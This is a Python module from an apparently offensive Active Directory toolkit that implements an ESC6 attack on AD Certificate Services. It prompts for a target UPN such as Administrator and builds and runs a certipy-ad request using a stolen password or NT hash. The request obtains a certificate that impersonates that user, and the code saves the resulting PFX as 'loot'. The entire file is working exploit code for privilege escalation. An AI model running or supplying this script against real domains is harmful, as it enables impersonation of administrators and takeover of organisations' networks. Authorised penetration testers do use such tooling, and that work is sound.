import os
from core.helpers import run_command, save_loot
from core.colors import blue, green, red, yellow

def abuse_esc6(session, template):
    print(blue("[>] ESC6: Abusing SAN override in certificate template to request a certificate for any UPN."))
    print(yellow("[*] This abuse lets you impersonate a privileged user by supplying their UPN in the request."))

    cas = session.adcs_metadata.get("cas", [])
    if not cas:
        print(red("[-] No CA data in session. Run 'adcs enum' first."))
        return

    ca_name = cas[0].get("name")
    if not ca_name or ca_name.lower() == "n/a":
        print(red("[-] Invalid CA name in session metadata."))
        return

    target_upn = input(f"[?] Enter target UPN (e.g., Administrator@{session.domain}): ").strip()
    if not target_upn or "@" not in target_upn:
        print(red("[-] Invalid UPN format."))
        return

    output_file = f"esc6_{target_upn.split('@')[0]}.pfx"

    if session.hash:
        auth = f"-u {session.username} -hashes :{session.hash}"
    elif session.password:
        auth = f"-u {session.username} -p '{session.password}'"
    else:
        print(red("[-] No valid authentication method provided."))
        return

    cmd = (
        f"certipy-ad req {auth} -dc-ip {session.dc_ip} -ca '{ca_name}' "
        f"-template '{template}' -upn '{target_upn}' -out {output_file}"
    )

    print(blue(f"[*] Requesting certificate impersonating {target_upn} using template '{template}'..."))
    out, err = run_command(cmd)
    print(out.strip() or err.strip())

    print(yellow("[!] If the PFX file was not created or saved, retry the attack. It could be a connection issue."))
    print(green(f"[+] Expected PFX output: loot/{output_file}"))
    print(yellow(f"[*] Command executed: {cmd}"))